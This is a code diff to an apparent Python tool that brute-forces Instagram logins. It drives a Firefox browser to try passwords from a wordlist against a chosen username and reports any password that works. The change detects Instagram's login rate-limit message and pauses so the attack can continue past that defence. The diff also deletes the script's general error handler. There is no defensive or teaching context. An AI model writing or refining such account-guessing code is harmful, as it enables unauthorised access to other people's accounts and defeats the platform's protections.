@@ -14,6 +14,8 @@ W = '\033[0m'  # white (normal)
 G = '\033[32m'  # green
 O = '\033[33m'  # orange
 
+timeout = "There was a problem logging you into Instagram. Please try again soon."
+
 def instUserCheck(username):
     try:
         driver = webdriver.Firefox()
@@ -37,12 +39,13 @@ def instagramBruteforce(username, wordlist, delay):
             elem.clear()
             elem.send_keys(password)
             elem.send_keys(Keys.RETURN)
+
+            if timeout in driver.page_source:
+                print O + "[!] Timeout raised! Waiting... [!]" + W
+                sleep(5000)
             print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
             sleep(delay)
             assert (("Login") in driver.title)
         except AssertionError:
             print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
             sys.exit(0)
-        except Exception, e :
-            print R + "[!] OOPs, something went wrong. Did you terminate the connection? [!]" + W
-            sys.exit(1)
